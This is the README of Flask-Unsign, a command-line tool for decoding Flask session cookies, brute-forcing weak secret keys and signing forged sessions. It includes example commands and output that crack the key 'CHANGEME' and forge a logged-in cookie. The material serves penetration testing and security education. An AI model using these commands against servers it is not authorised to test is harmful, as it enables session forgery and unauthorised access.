# Flask Unsign
Command line tool to fetch, decode, brute-force and craft session cookies of a Flask  application by guessing secret keys.
For the standalone wordlist component, please visit the [flask-unsign-wordlist](https://github.com/Paradoxis/Flask-Unsign-Wordlist) repository.

## Installation
To install the application, simply use pip:

```
$ pip install flask-unsign[wordlist]
```

If you only want to install the core code, omit the `[wordlist]` suffix:

``` 
$ pip install flask-unsign
```

To install the tool for development purposes, run the following command (after downloading a copy):

```
$ pip install -e .[test]
```

## Usage

To get an overview of all possible options, simply call flask-unsign without 
any arguments like so:

``` 
$ flask-unsign
```

### Obtaining & Decoding Session Cookies
Due to the fact that Flask cookies are **signed** and **not encrypted**, it's 
possible to locally decode the session data. For this, you can use the `--decode` 
argument.

Session cookies can be obtained by inspecting your HTTP requests using a proxy 
like  Burp Proxy, using your browser's network inspector or using a browser 
extension to view/change your cookies. By default, Flask uses the session name
`"session"`. 

```
$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
{'logged_in': False}
```

You can also use Flask-Unsign's automatic session grabbing functionality by 
passing the `--server` argument, instead of the `--cookie` argument. *Do note 
however, **that not all web pages might return a session**, so be sure to pass an
url which does.*

``` 
$ flask-unsign --decode --server 'https://www.example.com/login'
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8
{'logged_in': False}
```

### Unsigning (Brute Forcing Secret Keys)
After obtaining a sample session cookie, you'll be able to attempt to brute-force 
the server's secret key. If you're lucky, this might be set to something easy to 
guess, or if it's been found online, it might be in one of your wordlists. For 
this, you can use the `--unsign` argument.

``` 
$ flask-unsign --unsign --cookie < cookie.txt
[*] Session decodes to: {'logged_in': False}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 351 attempts
'CHANGEME'
```

### Signing (Session Manipulation)
Once you've obtained the server's secret key, you'll be able to craft your own 
custom session data. For this, you can use the `--sign` argument.

``` 
$ flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
eyJsb2dnZWRfaW4iOnRydWV9.XDuW-g.cPCkFmmeB7qNIcN-ReiN72r0hvU
``` 

## Troubleshooting

* **I found a secret key, but my crafted sessions don't work!**
    * It might be possible that your target server uses an older version of 
      [itsdangerous](https://github.com/pallets/itsdangerous). Due to 
      [an issue](https://github.com/pallets/itsdangerous/issues/46) with timed 
      sessions, the timestamp generation algorithm was changed. 
      To generate an older signature, try using the `--legacy` option.
* **My wordlist doesn't work**
    * Wordlists expect to be newline delimited 
      [python strings](https://docs.python.org/3/library/stdtypes.html#str) 
      (meaning you need to encapsulate them in quotes), this is so that 
      binary strings can easily be stored in a newline format. If you don't want 
      this, you can disable this feature by passing the `--no-literal-eval` 
      argument.


## How it works
If you're wondering how exactly this works, refer to my 
[blog post](https://blog.paradoxis.nl/) which explains this in great detail, 
including a guide on how to protect your own server from this attack.

## License
MIT License

Copyright (c) 2019 Luke Paris (Paradoxis)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
